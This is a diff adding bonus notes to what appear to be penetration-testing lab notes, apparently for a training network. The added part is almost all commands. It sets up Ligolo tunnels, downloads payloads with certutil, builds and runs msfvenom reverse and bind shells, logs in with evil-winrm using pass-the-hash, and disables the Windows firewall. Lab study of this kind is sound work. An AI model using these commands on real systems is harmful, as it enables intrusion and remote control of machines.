@@ -359,3 +359,71 @@ hostname
 dir /s/b \users\ proof.txt
 cd ..\
 dir desktop
+
+------------------------
+
+-------------------- MISC ----------------------------------------------------
+Note: These are just some bonus notes, not necessary for completion of the lab.
+
+
+In Ligolo:
+listener_list
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80
+listener_list
+
+python -m http.server -d . 80
+
+On DC1:
+certutil.exe -f urlcache http://ms01:8888/winrev443.exe winrev443.exe
+dir
+
+
+Reverse Shell:
+
+In Ligolo:
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:443
+listener_list
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.201 LPORT=4444 -f exe -o winrev4444ms01.exe
+nc -nvlp 443
+
+
+On DC1:
+evil-winrm -i 10.10.1.200 -u administrator -H 2345hjkh2345jkh25432
+upload winrev4444ms01.exe
+dir
+.\winrev4444ms01.exe
+
+
+whoami
+hostname
+exit
+
+
+Kali:
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80
+python -m http.server -d . 80
+
+MS02:
+certutil.exe -f -urlcache http://ms01:8888/winrev4444ms01.exe winrev4444ms01.exe
+.\winrev4444ms01.exe
+
+
+-----------------------------
+
+Bind Shell:
+
+msfvenom -p windows/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=4440 -f exe -o winbind4440.exe
+python -m http.server -d . 80
+
+On MS01:
+netsh advfirewall set allprofiles state off
+certutil.exe -f -urlcache http://ms01:8888/winbind4440.exe winbind4440.exe
+.\winbind4440.exe
+netstat -naob
+(Port 4440 is now open and listening! With the payload winbind4440.exe)
+
+nc 10.10.1.202 4440
+whoami
+hostname
+exit
